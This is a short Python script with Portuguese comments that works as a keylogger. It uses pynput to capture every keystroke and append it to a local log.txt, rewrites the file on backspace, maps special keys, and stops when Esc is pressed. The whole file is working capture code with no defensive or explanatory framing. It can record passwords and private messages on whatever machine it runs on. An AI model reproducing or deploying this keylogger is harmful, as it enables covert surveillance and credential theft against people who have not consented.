from pynput.keyboard import Key, Listener
from constants import special_chars

log_text = ""  # Variável para rastrear o texto do log

def on_press(key):
    global log_text  # Uso da variável global para rastrear o texto

    with open("log.txt", 'a') as logFile:
        try:
            if hasattr(key, 'char'):
                log_text += key.char  # Adiciona o caractere à variável de rastreamento
                logFile.write(key.char)
            elif key == Key.backspace:
                log_text = log_text[:-1]
                logFile.seek(0)  # Move o cursor de leitura/gravação para o início do arquivo
                logFile.truncate()  # Limpa todo o conteúdo do arquivo
                logFile.write(log_text)  # Reescreva o texto sem o último caractere
            else:
                # Mapear caracteres especiais para algo funcional
                if key in special_chars:
                    log_text += special_chars[key]
                    logFile.write(special_chars[key])
                else:
                    logFile.write(f'[Special Key: {key}]')
        except Exception as e:
            print(f'Erro ao obter o caractere: {e}')


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
